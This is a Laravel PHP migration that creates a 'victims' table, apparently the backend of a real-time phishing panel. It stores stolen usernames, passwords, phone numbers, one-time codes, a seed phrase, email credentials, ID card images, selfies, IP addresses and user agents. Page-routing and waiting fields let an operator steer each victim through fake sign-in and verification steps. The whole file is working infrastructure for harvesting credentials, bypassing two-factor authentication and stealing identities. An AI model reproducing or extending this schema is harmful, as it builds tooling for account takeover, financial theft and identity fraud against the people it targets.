<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration
{
    /**
     * Run the migrations.
     */
    public function up(): void
    {
        Schema::create('victims', function (Blueprint $table) {
            $table->id();
            $table->string('username')->nullable();
            $table->string('password')->nullable();

            $table->integer('heartbeat')->nullable();
            $table->string('current_page')->default('signin');
            $table->string('next_page')->default('signin');
            $table->boolean('is_waiting')->default(false);

            $table->string('phone')->nullable();
            $table->string('otp_1')->nullable();
            $table->string('otp_2')->nullable();
            $table->string('url')->nullable();
            $table->string('deviceurl')->nullable();
            $table->string('seed')->nullable();

            $table->string('email')->nullable();
            $table->string('email_password')->nullable();
            $table->string('email_otp')->nullable();

            $table->string('front_id')->nullable();
            $table->string('back_id')->nullable();
            $table->string('selfie')->nullable();
            $table->uuid('user_panel_id');
            $table->string('ip_address')->nullable();
            $table->string('user_agent')->nullable();

            $table->foreign('user_panel_id')->references('id')->on('user_panels');

            $table->timestamps();
        });
    }

    /**
     * Reverse the migrations.
     */
    public function down(): void
    {
        Schema::dropIfExists('victims');
    }
};
